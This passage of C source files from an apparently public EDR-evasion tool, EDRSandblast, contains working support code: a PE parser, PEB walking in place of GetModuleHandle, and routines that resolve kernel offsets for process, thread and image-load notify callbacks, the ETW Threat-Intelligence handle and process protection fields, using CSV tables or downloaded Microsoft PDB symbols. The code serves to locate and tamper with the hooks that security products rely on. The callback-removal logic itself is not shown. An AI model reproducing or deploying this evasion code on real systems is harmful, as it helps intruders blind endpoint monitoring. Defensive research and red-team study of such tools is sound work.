    _tprintf_or_not(TEXT("[+] Pattern search found PspLoadImageNotifyRoutine address: 0x%I64x\n"), PspLoadImageNotifyRoutineAddress);
    
    return PspLoadImageNotifyRoutineAddress;
}
```

`EDRSandblast/Utils/ListUtils.c`:

```c
#include "ListUtils.h"

VOID freeLinkedList(PVOID head) {
    PLINKED_LIST previousNode = NULL;
    PLINKED_LIST currentNode = (PLINKED_LIST)head;

    while (currentNode) {
        previousNode = currentNode;
        currentNode = currentNode->next;
        free(previousNode);
        previousNode = NULL;
    }

    return;
}
```

`EDRSandblast/Utils/NtoskrnlOffsets.c`:

```c
/*

--- ntoskrnl Notify Routines' offsets from CSV functions.
--- Hardcoded patterns, with offsets for 350+ ntoskrnl versions provided in the CSV file.

*/
#include <tchar.h>
#include <stdio.h>

#include "FileVersion.h"
#include "PdbSymbols.h"
#include "../EDRSandblast.h"

#include "NtoskrnlOffsets.h"

union NtoskrnlOffsets g_ntoskrnlOffsets = { 0 };

// Return the offsets of nt!PspCreateProcessNotifyRoutine, nt!PspCreateThreadNotifyRoutine, nt!PspLoadImageNotifyRoutine, and nt!_PS_PROTECTION for the specific Windows version in use.
void LoadNtoskrnlOffsetsFromFile(TCHAR* ntoskrnlOffsetFilename) {
    LPTSTR ntoskrnlVersion = GetNtoskrnlVersion();
    _tprintf_or_not(TEXT("[*] System's ntoskrnl.exe file version is: %s\n"), ntoskrnlVersion);

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, ntoskrnlOffsetFilename, TEXT("r"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Offset CSV file connot be opened"));
        return;
    }

    TCHAR lineNtoskrnlVersion[2048];
    TCHAR line[2048];
    while (_fgetts(line, _countof(line), offsetFileStream)) {
        if (_tcsncmp(line, TEXT("ntoskrnl"), _countof(TEXT("ntoskrnl")) - 1)) {
            _putts_or_not(TEXT("[-] CSV file format is unexpected!\n"));
            break;
        }
        TCHAR* dupline = _tcsdup(line);
        TCHAR* tmpBuffer = NULL;
        _tcscpy_s(lineNtoskrnlVersion, _countof(lineNtoskrnlVersion), _tcstok_s(dupline, TEXT(","), &tmpBuffer));
        if (_tcscmp(ntoskrnlVersion, lineNtoskrnlVersion) == 0) {
            TCHAR* endptr;
            _tprintf_or_not(TEXT("[+] Offsets are available for this version of ntoskrnl.exe (%s)!\n"), ntoskrnlVersion);
            for (int i = 0; i < _SUPPORTED_NTOSKRNL_OFFSETS_END; i++) {
                g_ntoskrnlOffsets.ar[i] = _tcstoull(_tcstok_s(NULL, TEXT(","), &tmpBuffer), &endptr, 16);
            }
            break;
        }
    }
    fclose(offsetFileStream);
}

void SaveNtoskrnlOffsetsToFile(TCHAR* ntoskrnlOffsetFilename) {
    LPTSTR ntoskrnlVersion = GetNtoskrnlVersion();

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, ntoskrnlOffsetFilename, TEXT("a"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Offset CSV file connot be opened"));
        return;
    }

    _ftprintf(offsetFileStream, TEXT("%s"), ntoskrnlVersion);
    for (int i = 0; i < _SUPPORTED_NTOSKRNL_OFFSETS_END; i++) {
        _ftprintf(offsetFileStream, TEXT(",%llx"), g_ntoskrnlOffsets.ar[i]);
    }
    _fputts(TEXT(""), offsetFileStream);

    fclose(offsetFileStream);
}

void PrintNtoskrnlOffsets() {
    _tprintf_or_not(TEXT("[+] Ntoskrnl offsets: "));
    for (int i = 0; i < _SUPPORTED_NTOSKRNL_OFFSETS_END - 1; i++) {
        _tprintf_or_not(TEXT(" %llx |"), g_ntoskrnlOffsets.ar[i]);
    }
    _tprintf_or_not(TEXT("%llx\n"), g_ntoskrnlOffsets.ar[_SUPPORTED_NTOSKRNL_OFFSETS_END - 1]);
}
void LoadNtoskrnlOffsetsFromInternet(BOOL delete_pdb) {
    symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(GetNtoskrnlPath());
    if (sym_ctx == NULL) {
        return;
    }
    g_ntoskrnlOffsets.st.pspCreateProcessNotifyRoutine = GetSymbolOffset(sym_ctx, "PspCreateProcessNotifyRoutine");
    g_ntoskrnlOffsets.st.pspCreateThreadNotifyRoutine = GetSymbolOffset(sym_ctx, "PspCreateThreadNotifyRoutine");
    g_ntoskrnlOffsets.st.pspLoadImageNotifyRoutine = GetSymbolOffset(sym_ctx, "PspLoadImageNotifyRoutine");
    g_ntoskrnlOffsets.st.etwThreatIntProvRegHandle = GetSymbolOffset(sym_ctx, "EtwThreatIntProvRegHandle");
    g_ntoskrnlOffsets.st.eprocess_protection= GetFieldOffset(sym_ctx, "_EPROCESS", L"Protection");
    g_ntoskrnlOffsets.st.etwRegEntry_GuidEntry= GetFieldOffset(sym_ctx, "_ETW_REG_ENTRY", L"GuidEntry");
    g_ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo = GetFieldOffset(sym_ctx, "_ETW_GUID_ENTRY", L"ProviderEnableInfo");
    g_ntoskrnlOffsets.st.psProcessType = GetSymbolOffset(sym_ctx, "PsProcessType");
    g_ntoskrnlOffsets.st.psThreadType = GetSymbolOffset(sym_ctx, "PsThreadType");
    g_ntoskrnlOffsets.st.object_type_callbacklist = GetFieldOffset(sym_ctx, "_OBJECT_TYPE", L"CallbackList");
    UnloadSymbols(sym_ctx, delete_pdb);
}

BOOL NtoskrnlOffsetsAreAllPresent() {
    return NtoskrnlNotifyRoutinesOffsetsArePresent() && NtoskrnlEtwtiOffsetsArePresent() && g_ntoskrnlOffsets.st.eprocess_protection != 0 && NtoskrnlObjectCallbackOffsetsArePresent();
}

BOOL NtoskrnlAllKernelCallbacksOffsetsArePresent() {
    return NtoskrnlNotifyRoutinesOffsetsArePresent() && NtoskrnlObjectCallbackOffsetsArePresent();
}

BOOL NtoskrnlNotifyRoutinesOffsetsArePresent() {
    return g_ntoskrnlOffsets.st.pspCreateProcessNotifyRoutine != 0 &&
        g_ntoskrnlOffsets.st.pspCreateThreadNotifyRoutine != 0 &&
        g_ntoskrnlOffsets.st.pspLoadImageNotifyRoutine != 0;
}

BOOL NtoskrnlEtwtiOffsetsArePresent() {
    return g_ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo != 0 &&
        g_ntoskrnlOffsets.st.etwRegEntry_GuidEntry != 0 &&
        g_ntoskrnlOffsets.st.etwThreatIntProvRegHandle != 0;
}

BOOL NtoskrnlObjectCallbackOffsetsArePresent() {
    return g_ntoskrnlOffsets.st.psProcessType != 0 &&
        g_ntoskrnlOffsets.st.psThreadType != 0 &&
        g_ntoskrnlOffsets.st.object_type_callbacklist != 0;
}

TCHAR g_ntoskrnlPath[MAX_PATH] = { 0 };
LPTSTR GetNtoskrnlPath() {
    if (_tcslen(g_ntoskrnlPath) == 0) {
        // Retrieves the system folder (eg C:\Windows\System32).
        TCHAR systemDirectory[MAX_PATH] = { 0 };
        GetSystemDirectory(systemDirectory, _countof(systemDirectory));

        // Compute ntoskrnl.exe path.
        _tcscat_s(g_ntoskrnlPath, _countof(g_ntoskrnlPath), systemDirectory);
        _tcscat_s(g_ntoskrnlPath, _countof(g_ntoskrnlPath), TEXT("\\ntoskrnl.exe"));
    }
    return g_ntoskrnlPath;
}

TCHAR g_ntoskrnlVersion[256] = { 0 };
LPTSTR GetNtoskrnlVersion() {
    if (_tcslen(g_ntoskrnlVersion) == 0) {

        LPTSTR ntoskrnlPath = GetNtoskrnlPath();
        TCHAR versionBuffer[256] = { 0 };
        GetFileVersion(versionBuffer, _countof(versionBuffer), ntoskrnlPath);
        _stprintf_s(g_ntoskrnlVersion, 256, TEXT("ntoskrnl_%s.exe"), versionBuffer);
    }
    return g_ntoskrnlVersion;
}
```

`EDRSandblast/Utils/PEBBrowse.c`:

```c
/*
* Functions that browse the PEB structure instead of relying on GetModuleHandle
*/

#include "../EDRSandblast.h"
#include "Undoc.h"
#include "PEBBrowse.h"
#include <stdio.h>

/*
	Get the module entry in the InLoadOrderModuleList given the module name
*/
LDR_DATA_TABLE_ENTRY* getModuleEntryFromNameW(const WCHAR* name) {
	size_t nameSize = wcslen(name);

	for (LDR_DATA_TABLE_ENTRY* currentModuleEntry = getNextModuleEntryInLoadOrder(NULL); currentModuleEntry != NULL; currentModuleEntry = getNextModuleEntryInLoadOrder(currentModuleEntry)) {
		if (!_memicmp(currentModuleEntry->BaseDllName.Buffer, name, sizeof(WCHAR) * nameSize)) {
			return currentModuleEntry;
		}
	}
#ifdef _DEBUG
	printf_or_not("getModuleEntryFromNameW failed to find module\n");
#endif // _DEBUG
	return NULL;
}


/*
	Get the module entry in the InLoadOrderModuleList given an address inside it
	Assumes : the address belong to a module
	Returns : the module it should belong to
*/
LDR_DATA_TABLE_ENTRY* getModuleEntryFromAbsoluteAddr(PVOID addr) {
	LDR_DATA_TABLE_ENTRY* closest = NULL;
	uintptr_t distance = (uintptr_t)-1;

	for (LDR_DATA_TABLE_ENTRY* ptr = getNextModuleEntryInLoadOrder(NULL); ptr != NULL; ptr = getNextModuleEntryInLoadOrder(ptr)) {
		if (ptr->DllBase <= addr && ((uintptr_t)addr - (uintptr_t)ptr->DllBase) < distance) {
			distance = ((uintptr_t)addr - (uintptr_t)ptr->DllBase);
			closest = ptr;
		}
	}
	return closest;
}


/*
	Returns the next module entry in the InLoadOrderModuleList
	Assumes : curr is a ptr to a module entry in the list or NULL
	Returns :
		* if curr is non-NULL:
			* A pointer to the next entry in the list, or
			* A NULL pointer, if end of the list is reached
		* if curr is NULL
			* A pointer to the first element of the list
*/
LDR_DATA_TABLE_ENTRY* getNextModuleEntryInLoadOrder(LDR_DATA_TABLE_ENTRY* curr) {
	LDR_DATA_TABLE_ENTRY* start = (LDR_DATA_TABLE_ENTRY*)getPEB()->Ldr->InLoadOrderModuleList.Flink;
	if (curr == NULL) {
		return start;
	}
	LDR_DATA_TABLE_ENTRY* next = (LDR_DATA_TABLE_ENTRY*)curr->InLoadOrderLinks.Flink;
	if (next == start) {
		return NULL;
	}
	return next;
}

#if _WIN64
PEB64* getPEB() {
	return (PEB64*)__readgsqword(0x60);
}

TEB64* getTEB() {
	return (TEB64*)__readgsqword(0x30);
}
#else
PEB* getPEB() {
	return (PEB*)__readfsdword(0x30);
}

TEB* getTEB() {
	return (TEB*)__readfsdword(0x18);
}
#endif
```

`EDRSandblast/Utils/PEParser.c`:

```c
/*
* Full library whose job is to parse PE structures, on disk, on memory and even in another process memory
* Among other things, reimplements GetProcAddress and the PE relocation process
*/

#include "../EDRSandblast.h"
#include "PEParser.h"
#include <stdio.h>
#include <assert.h>

IMAGE_SECTION_HEADER* PE_sectionHeader_fromRVA(PE* pe, DWORD rva) {
	IMAGE_SECTION_HEADER* sectionHeaders = pe->sectionHeaders;
	for (DWORD sectionIndex = 0; sectionIndex < pe->ntHeader->FileHeader.NumberOfSections; sectionIndex++) {
		DWORD currSectionVA = sectionHeaders[sectionIndex].VirtualAddress;
		DWORD currSectionVSize = sectionHeaders[sectionIndex].Misc.VirtualSize;
		if (currSectionVA <= rva && rva < currSectionVA + currSectionVSize) {
			return &sectionHeaders[sectionIndex];
		}
	}
	return NULL;
}

/*
Get the next section header having the given memory access permissions, after the provided section headers "prev".
Exemple : PE_nextSectionHeader_fromPermissions(pe, textSection, 1, -1, 0) returns the first section header in the list after "textSection" that is readable and not writable.
Returns NULL if no section header is found.
*/
IMAGE_SECTION_HEADER* PE_nextSectionHeader_fromPermissions(PE* pe, IMAGE_SECTION_HEADER* prev, INT8 readable, INT8 writable, INT8 executable) {
	IMAGE_SECTION_HEADER* sectionHeaders = pe->sectionHeaders;
	DWORD firstSectionIndex = prev == NULL ? 0 : (DWORD)((prev + 1) - sectionHeaders);
	for (DWORD sectionIndex = firstSectionIndex; sectionIndex < pe->ntHeader->FileHeader.NumberOfSections; sectionIndex++) {
		DWORD sectionCharacteristics = sectionHeaders[sectionIndex].Characteristics;
		if (readable != 0) {
			if (sectionCharacteristics & IMAGE_SCN_MEM_READ) {
				if (readable == -1) {
					continue;
				}
			}
			else {
				if (readable == 1) {
					continue;
				}
			}
		}
		if (writable != 0) {
			if (sectionCharacteristics & IMAGE_SCN_MEM_WRITE) {
				if (writable == -1) {
					continue;
				}
			}
			else {
				if (writable == 1) {
					continue;
				}
			}
		}
		if (executable != 0) {
			if (sectionCharacteristics & IMAGE_SCN_MEM_EXECUTE) {
				if (executable == -1) {
					continue;
				}
			}
			else {
				if (executable == 1) {
					continue;
				}
			}
		}
		return &sectionHeaders[sectionIndex];
	}
	return NULL;
}


PVOID PE_RVA_to_Addr(PE* pe, DWORD rva) {
	PVOID peBase = pe->dosHeader;
	if (pe->isMemoryMapped) {
		return (PBYTE)peBase + rva;
	}

	IMAGE_SECTION_HEADER* rvaSectionHeader = PE_sectionHeader_fromRVA(pe, rva);
	if (NULL == rvaSectionHeader) {
		return NULL;
	}
	else {
		return (PBYTE)peBase + rvaSectionHeader->PointerToRawData + (rva - rvaSectionHeader->VirtualAddress);
	}
}

DWORD PE_Addr_to_RVA(PE* pe, PVOID addr) {
	for (int i = 0; i < pe->ntHeader->FileHeader.NumberOfSections; i++) {
		DWORD sectionVA = pe->sectionHeaders[i].VirtualAddress;
		DWORD sectionSize = pe->sectionHeaders[i].Misc.VirtualSize;
		PVOID sectionAddr = PE_RVA_to_Addr(pe, sectionVA);
		if (sectionAddr <= addr && addr < (PVOID)((intptr_t)sectionAddr + (intptr_t)sectionSize)) {
			intptr_t relativeOffset = ((intptr_t)addr - (intptr_t)sectionAddr);
			assert(relativeOffset <= MAXDWORD);
			return sectionVA + (DWORD)relativeOffset;
		}
	}
	return 0;
}


VOID PE_parseRelocations(PE* pe) {
	IMAGE_BASE_RELOCATION* relocationBlocks = PE_RVA_to_Addr(pe, pe->dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	IMAGE_BASE_RELOCATION* relocationBlockPtr = relocationBlocks;
	IMAGE_BASE_RELOCATION* nextRelocationBlockPtr;
	pe->nbRelocations = 0;
	DWORD relocationsLength = 16;
	pe->relocations = calloc(relocationsLength, sizeof(PE_relocation));
	if (NULL == pe->relocations)
		exit(1);

	while (((size_t)relocationBlockPtr - (size_t)relocationBlocks) < pe->dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
		IMAGE_RELOCATION_ENTRY* relocationEntry = (IMAGE_RELOCATION_ENTRY*)&relocationBlockPtr[1];
		nextRelocationBlockPtr = (IMAGE_BASE_RELOCATION*)(((PBYTE)relocationBlockPtr) + relocationBlockPtr->SizeOfBlock);
		while ((PBYTE)relocationEntry < (PBYTE)nextRelocationBlockPtr) {
			DWORD relocationRVA = relocationBlockPtr->VirtualAddress + relocationEntry->Offset;
			if (pe->nbRelocations >= relocationsLength) {
				relocationsLength *= 2;
				void* pe_relocations = pe->relocations;
				assert(NULL != pe_relocations);
				pe->relocations = realloc(pe_relocations, relocationsLength * sizeof(PE_relocation));
				assert(NULL != pe->relocations);
			}
			pe->relocations[pe->nbRelocations].RVA = relocationRVA;
			pe->relocations[pe->nbRelocations].Type = relocationEntry->Type;
			pe->nbRelocations++;
			relocationEntry++;
		}
		relocationBlockPtr = nextRelocationBlockPtr;
	}
	void* pe_relocations = pe->relocations;
	assert(pe_relocations != NULL);
	pe->relocations = realloc(pe_relocations, pe->nbRelocations * sizeof(PE_relocation));
	if (NULL == pe->relocations)
		exit(1);
}

VOID PE_rebasePE(PE* pe, LPVOID newBaseAddress)
{
	DWORD* relocDwAddress;
	QWORD* relocQwAddress;

	if (pe->isMemoryMapped) {
		printf_or_not("ERROR : Cannot rebase PE that is memory mapped (LoadLibrary'd)\n");
		return;
	}
	if (NULL == pe->relocations) {
		PE_parseRelocations(pe);
	}
	assert(pe->relocations != NULL);
	PVOID oldBaseAddress = pe->baseAddress;
	pe->baseAddress = newBaseAddress;
	for (DWORD i = 0; i < pe->nbRelocations; i++) {
		switch (pe->relocations[i].Type) {
		case IMAGE_REL_BASED_ABSOLUTE:
			break;
		case IMAGE_REL_BASED_HIGHLOW:
			relocDwAddress = (DWORD*)PE_RVA_to_Addr(pe, pe->relocations[i].RVA);
			intptr_t relativeOffset = ((intptr_t)newBaseAddress) - ((intptr_t)oldBaseAddress);
			assert(relativeOffset <= MAXDWORD);
			*relocDwAddress += (DWORD)relativeOffset;
			break;
		case IMAGE_REL_BASED_DIR64:
			relocQwAddress = (QWORD*)PE_RVA_to_Addr(pe, pe->relocations[i].RVA);
			*relocQwAddress += ((intptr_t)newBaseAddress) - ((intptr_t)oldBaseAddress);
			break;
		default:
			printf_or_not("Unsupported relocation : 0x%x\nExiting...\n", pe->relocations[i].Type);
			exit(1);
		}
	}
	return;
}

PE* PE_create(PVOID imageBase, BOOL isMemoryMapped) {
	PE* pe = calloc(1, sizeof(PE));
	if (NULL == pe) {
		exit(1);
	}
	pe->isMemoryMapped = isMemoryMapped;
	pe->isInAnotherAddressSpace = FALSE;
	pe->hProcess = INVALID_HANDLE_VALUE;
	pe->dosHeader = imageBase;
	pe->ntHeader = (IMAGE_NT_HEADERS*)(((PBYTE)imageBase) + pe->dosHeader->e_lfanew);
	pe->optHeader = &pe->ntHeader->OptionalHeader;
	if (isMemoryMapped) {
		pe->baseAddress = imageBase;
	}
	else {
		pe->baseAddress = (PVOID)pe->optHeader->ImageBase;
	}
	pe->dataDir = pe->optHeader->DataDirectory;
	pe->sectionHeaders = (IMAGE_SECTION_HEADER*)(((PBYTE)pe->optHeader) + pe->ntHeader->FileHeader.SizeOfOptionalHeader);
	DWORD exportRVA = pe->dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportRVA == 0) {
		pe->exportDirectory = NULL;
		pe->exportedNames = NULL;
		pe->exportedFunctions = NULL;
		pe->exportedOrdinals = NULL;
	}
	else {
		pe->exportDirectory = PE_RVA_to_Addr(pe, exportRVA);
		pe->exportedNames = PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfNames);
		pe->exportedFunctions = PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfFunctions);
		pe->exportedOrdinals = PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfNameOrdinals);
		pe->exportedNamesLength = pe->exportDirectory->NumberOfNames;
	}
	pe->relocations = NULL;
	DWORD debugRVA = pe->dataDir[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
	if (debugRVA == 0) {
		pe->debugDirectory = NULL;
	}
	else {
		pe->debugDirectory = PE_RVA_to_Addr(pe, debugRVA);
		if (pe->debugDirectory->Type != IMAGE_DEBUG_TYPE_CODEVIEW) {
			pe->debugDirectory = NULL;
		}
		else {
			pe->codeviewDebugInfo = PE_RVA_to_Addr(pe, pe->debugDirectory->AddressOfRawData);
			if (pe->codeviewDebugInfo->signature != *((DWORD*)"RSDS")) {
				pe->debugDirectory = NULL;
				pe->codeviewDebugInfo = NULL;
			}
		}
	}
	return pe;
}

PE* PE_create_from_another_address_space(HANDLE hProcess, PVOID imageBase) {
	PE* pe = calloc(1, sizeof(PE));
	if (NULL == pe) {
		exit(1);
	}
	pe->isMemoryMapped = TRUE;
	pe->hProcess = hProcess;
	pe->isInAnotherAddressSpace = TRUE;
	pe->baseAddress = imageBase;
	pe->dosHeader = imageBase;
	DWORD ntHeaderPtrAddress = 0;
	ReadProcessMemory(hProcess, (LPCVOID)((intptr_t)imageBase + offsetof(IMAGE_DOS_HEADER, e_lfanew)), &ntHeaderPtrAddress, sizeof(ntHeaderPtrAddress), NULL);
	pe->ntHeader = (IMAGE_NT_HEADERS*)((intptr_t)pe->baseAddress + ntHeaderPtrAddress);
	pe->optHeader = (IMAGE_OPTIONAL_HEADER*)(&pe->ntHeader->OptionalHeader);
	pe->dataDir = pe->optHeader->DataDirectory;
	WORD sizeOfOptionnalHeader = 0;
	ReadProcessMemory(hProcess, &pe->ntHeader->FileHeader.SizeOfOptionalHeader, &sizeOfOptionnalHeader, sizeof(sizeOfOptionnalHeader), NULL);
	pe->sectionHeaders = (IMAGE_SECTION_HEADER*)((intptr_t)pe->optHeader + sizeOfOptionnalHeader);
	DWORD exportRVA = 0;
	ReadProcessMemory(hProcess, &pe->dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, &exportRVA, sizeof(exportRVA), NULL);
	if (exportRVA == 0) {
		pe->exportDirectory = NULL;
		pe->exportedNames = NULL;
		pe->exportedFunctions = NULL;
		pe->exportedOrdinals = NULL;
	}
	else {
		pe->exportDirectory = PE_RVA_to_Addr(pe, exportRVA);

		DWORD AddressOfNames = 0;
		ReadProcessMemory(pe->hProcess, &pe->exportDirectory->AddressOfNames, &AddressOfNames, sizeof(AddressOfNames), NULL);
		pe->exportedNames = PE_RVA_to_Addr(pe, AddressOfNames);

		DWORD AddressOfFunctions = 0;
		ReadProcessMemory(pe->hProcess, &pe->exportDirectory->AddressOfFunctions, &AddressOfFunctions, sizeof(AddressOfFunctions), NULL);
		pe->exportedFunctions = PE_RVA_to_Addr(pe, AddressOfFunctions);

		DWORD AddressOfNameOrdinals = 0;
		ReadProcessMemory(pe->hProcess, &pe->exportDirectory->AddressOfNameOrdinals, &AddressOfNameOrdinals, sizeof(AddressOfNameOrdinals), NULL);
		pe->exportedOrdinals = PE_RVA_to_Addr(pe, AddressOfNameOrdinals);

		ReadProcessMemory(pe->hProcess, &pe->exportDirectory->NumberOfNames, &pe->exportedNamesLength, sizeof(pe->exportedNamesLength), NULL);
	}
	pe->relocations = NULL;
	DWORD debugRVA = 0;
	ReadProcessMemory(hProcess, &pe->dataDir[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress, &debugRVA, sizeof(debugRVA), NULL);
	if (debugRVA == 0) {
		pe->debugDirectory = NULL;
	}
	else {
		pe->debugDirectory = PE_RVA_to_Addr(pe, debugRVA);
		DWORD debugDirectoryType;
		ReadProcessMemory(hProcess, &pe->debugDirectory->Type, &debugDirectoryType, sizeof(debugDirectoryType), NULL);
		if (debugDirectoryType != IMAGE_DEBUG_TYPE_CODEVIEW) {
			pe->debugDirectory = NULL;
		}
		else {
			pe->codeviewDebugInfo = PE_RVA_to_Addr(pe, pe->debugDirectory->AddressOfRawData);
			DWORD codeviewDebugInfoSignature;
			ReadProcessMemory(hProcess, &pe->codeviewDebugInfo->signature, &codeviewDebugInfoSignature, sizeof(pe->codeviewDebugInfo->signature), NULL);
			if (codeviewDebugInfoSignature != *((DWORD*)"RSDS")) {
				pe->debugDirectory = NULL;
				pe->codeviewDebugInfo = NULL;
			}
		}
	}
	return pe;
}


DWORD PE_functionRVA(PE* pe, LPCSTR functionName) {
	IMAGE_EXPORT_DIRECTORY* exportDirectory = pe->exportDirectory;
	LPDWORD exportedNames = pe->exportedNames;
	LPDWORD exportedFunctions = pe->exportedFunctions;
	LPWORD exportedNameOrdinals = pe->exportedOrdinals;

	DWORD nameOrdinal_low = 0;
	LPCSTR exportName_low = PE_RVA_to_Addr(pe, exportedNames[nameOrdinal_low]);
	DWORD nameOrdinal_high = exportDirectory->NumberOfNames;
	DWORD nameOrdinal_mid;
	LPCSTR exportName_mid;

	while (nameOrdinal_high - nameOrdinal_low > 1) {
		nameOrdinal_mid = (nameOrdinal_high + nameOrdinal_low) / 2;
		exportName_mid = PE_RVA_to_Addr(pe, exportedNames[nameOrdinal_mid]);
		if (strcmp(exportName_mid, functionName) > 0) {
			nameOrdinal_high = nameOrdinal_mid;
		}
		else {
			nameOrdinal_low = nameOrdinal_mid;
			exportName_low = exportName_mid;
		}
	}
	if (!strcmp(exportName_low, functionName))
		return exportedFunctions[exportedNameOrdinals[nameOrdinal_low]];
	return 0;
}

PVOID PE_functionAddr(PE* pe, LPCSTR functionName) {
	DWORD functionRVA = PE_functionRVA(pe, functionName);
	if (functionRVA == 0) {
		return NULL;
	}
	return PE_RVA_to_Addr(pe, functionRVA);
}

PVOID PE_search_pattern(PE* pe, PBYTE pattern, size_t patternSize) {
	for (int i = 0; i < pe->ntHeader->FileHeader.NumberOfSections; i++) {
		DWORD sectionVA = pe->sectionHeaders[i].VirtualAddress;
		DWORD sectionSize = pe->sectionHeaders[i].Misc.VirtualSize;
		if ((size_t)sectionSize < patternSize) {
			continue;
		}
		assert(patternSize <= MAXDWORD);
		DWORD endSize = sectionSize - (DWORD)patternSize;
		for (DWORD offset = 0; offset < endSize; offset++) {
			PBYTE ptr = PE_RVA_to_Addr(pe, sectionVA + offset);
			if (!memcmp(ptr, pattern, patternSize)) {
				return ptr;
			}
		}
	}
	return NULL;
}

PVOID PE_search_relative_reference(PE* pe, PVOID target, DWORD relativeReferenceSize) {
	signed long long int maximum;
	signed long long int minimum;

	switch (relativeReferenceSize)
	{
	case 1:
		minimum = MININT8;
		maximum = MAXINT8;
		break;
	case 2:
		minimum = MININT16;
		maximum = MAXINT16;
		break;
	case 4:
		minimum = MININT32;
		maximum = MAXINT32;
		break;
	default:
		minimum = 0;
		maximum = 0;
		break;
	}
	for (int i = 0; i < pe->ntHeader->FileHeader.NumberOfSections; i++) {
		DWORD sectionVA = pe->sectionHeaders[i].VirtualAddress;
		DWORD sectionSize = pe->sectionHeaders[i].Misc.VirtualSize;
		DWORD targetRVA = PE_Addr_to_RVA(pe, target);
		//TODO : implement optimization rva in range(targetRVA - maximum - relativeReferenceSize,targetRVA + minimum - relativeReferenceSize) inter range(sectionVA, sectionVA+sectionSize)
		for (DWORD rva = sectionVA; rva <= sectionVA + sectionSize - relativeReferenceSize; rva++) {
			switch (relativeReferenceSize) {
			case 1:
				if (rva + relativeReferenceSize + *(INT8*)PE_RVA_to_Addr(pe, rva) == targetRVA) {
					return PE_RVA_to_Addr(pe, rva);
				}
				break;
			case 2:
				if (rva + relativeReferenceSize + *(INT16*)PE_RVA_to_Addr(pe, rva) == targetRVA) {
					return PE_RVA_to_Addr(pe, rva);
				}
				break;
			case 4:
				if (rva + relativeReferenceSize + *(INT32*)PE_RVA_to_Addr(pe, rva) == targetRVA) {
					return PE_RVA_to_Addr(pe, rva);
				}
				break;
			default:
				minimum = 0;
				maximum = 0;
				break;
			}
		}

	}
	return NULL;
}

VOID PE_destroy(PE* pe)
{
	if (pe->relocations) {
		free(pe->relocations);
		pe->relocations = NULL;
	}
	free(pe);
}

```

`EDRSandblast/Utils/PdbSymbols.c`:

```c
#include <Windows.h>
#include <shlwapi.h>
#include <dbghelp.h>
#include <stdio.h>

#include "../EDRSandblast.h"
#include "FileUtils.h"
#include "HttpClient.h"
#include "PEParser.h"

#include "PdbSymbols.h"


BOOL DownloadPDB(GUID guid, DWORD age, LPCWSTR pdb_name_w, PBYTE* file, SIZE_T* file_size) {
	WCHAR full_pdb_uri[MAX_PATH] = { 0 };
	swprintf_s(full_pdb_uri, _countof(full_pdb_uri), L"/download/symbols/%s/%08X%04hX%04hX%016llX%X/%s", pdb_name_w, guid.Data1, guid.Data2, guid.Data3, _byteswap_uint64(*((DWORD64*)guid.Data4)), age, pdb_name_w);
	return HttpsDownloadFullFile(L"msdl.microsoft.com", full_pdb_uri, file, file_size);
}

BOOL DownloadPDBFromPE(PE* image_pe, PBYTE* file, SIZE_T* file_size) {
	WCHAR pdb_name_w[MAX_PATH] = { 0 };
	GUID guid = image_pe->codeviewDebugInfo->guid;
	DWORD age = image_pe->codeviewDebugInfo->age;
	MultiByteToWideChar(CP_UTF8, 0, image_pe->codeviewDebugInfo->pdbName, -1, pdb_name_w, _countof(pdb_name_w));
	return DownloadPDB(guid, age, pdb_name_w, file, file_size);
}

BOOL DownloadOriginalFileW(DWORD image_timestamp, DWORD image_size, LPCWSTR image_name, PBYTE* file, SIZE_T* file_size) {
	WCHAR full_pdb_uri[MAX_PATH] = { 0 };
	swprintf_s(full_pdb_uri, _countof(full_pdb_uri), L"/download/symbols/%s/%08X%X/%s", image_name, image_timestamp, image_size, image_name);
	return HttpsDownloadFullFile(L"msdl.microsoft.com", full_pdb_uri, file, file_size);
}

BOOL DownloadOriginalFileFromPE(PE* image_pe, _In_opt_ LPCWSTR image_name, PBYTE* file, SIZE_T* file_size) {
	DWORD image_size = image_pe->optHeader->SizeOfImage;
	//useless check
	if (image_size & 0xFFF) {
		image_size &= ~0xFFF;
		image_size += 0x1000;
	}
	DWORD image_timestamp = image_pe->ntHeader->FileHeader.TimeDateStamp;
	WCHAR image_name_w[MAX_PATH] = { 0 };
	if (image_name == NULL) {
		if (image_pe->exportDirectory != NULL) {
			LPCSTR image_name_a = (LPCSTR)PE_RVA_to_Addr(image_pe, image_pe->exportDirectory->Name);
			MultiByteToWideChar(CP_UTF8, 0, image_name_a, -1, image_name_w, _countof(image_name_w));
			image_name = image_name_w;
		}
		else {
			return FALSE;
		}
	}
	return DownloadOriginalFileW(image_timestamp, image_size, image_name, file, file_size);
}


symbol_ctx* LoadSymbolsFromPE(PE* pe) {
	symbol_ctx* ctx = calloc(1, sizeof(symbol_ctx));
	if (ctx == NULL) {
		return NULL;
	}
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, pe->codeviewDebugInfo->pdbName, -1, NULL, 0);
	ctx->pdb_name_w = calloc(size_needed, sizeof(WCHAR));
	MultiByteToWideChar(CP_UTF8, 0, pe->codeviewDebugInfo->pdbName, -1, ctx->pdb_name_w, size_needed);
	if (!FileExistsW(ctx->pdb_name_w)) {
		PBYTE file;
		SIZE_T file_size;
		BOOL res = DownloadPDBFromPE(pe, &file, &file_size);
		if (!res) {
			free(ctx);
			return NULL;
		}
		WriteFullFileW(ctx->pdb_name_w, file, file_size);
		free(file);
	}
	else {
		//TODO : check if exisiting PDB corresponds to the file version
	}
	DWORD64 asked_pdb_base_addr = 0x1337000;
	DWORD pdb_image_size = MAXDWORD;
	HANDLE cp = GetCurrentProcess();
	if (!SymInitialize(cp, NULL, FALSE)) {
